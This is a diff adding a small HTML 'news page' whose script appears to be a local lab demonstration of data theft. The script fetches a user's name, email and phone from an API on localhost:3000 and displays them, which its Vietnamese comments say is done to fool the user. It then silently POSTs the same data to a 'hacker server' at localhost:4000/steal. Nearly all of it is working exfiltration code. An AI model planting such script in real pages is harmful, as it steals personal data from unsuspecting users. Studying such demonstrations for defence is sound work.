@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+
+<html>
+
+<body>
+
+<h1>Trang Tin Tuc</h1>
+
+<script>
+
+    alert("TEST");
+
+fetch(
+"http://localhost:3000/api/user"
+)
+
+.then(response=>response.json())
+
+.then(data => {
+                // 1. Vẫn hiển thị ra màn hình như cũ để đánh lừa người dùng
+                document.body.innerHTML += "<h3>" + data.name + "</h3>";
+                document.body.innerHTML += "<h3>" + data.email + "</h3>";
+                document.body.innerHTML += "<h3>SĐT: " + data.phone + "</h3>";
+
+                // 2.Ngầm gửi dữ liệu đã lấy trộm sang server hacker (port 4000)
+                fetch("http://localhost:4000/steal", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data) 
+                }).catch(err => {
+                    console.log("Luồng tấn công đúng: Dữ liệu đã được đóng gói và cố gắng gửi về Server Hacker (Port 4000)");
+                });
+});
+
+</script>
+
+</body>
+
+</html>
